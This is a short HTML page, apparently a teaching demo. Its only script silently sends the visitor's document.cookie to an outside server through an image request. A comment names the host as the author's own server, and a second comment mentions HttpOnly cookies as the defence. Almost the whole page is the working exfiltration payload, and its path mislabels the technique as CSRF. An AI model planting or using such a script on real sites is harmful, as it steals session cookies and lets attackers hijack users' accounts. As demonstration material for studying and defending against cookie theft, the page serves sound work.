<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible"
        content="IE=edge">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script>
    let img = new Image();
    //link to my own server
    //to protect, make sure the cookie can only be read via http requests, to protect from this
    img.src = "http://its.aug_30/csfrHack?cookie=" + document.cookie;
    </script>
</body>

</html>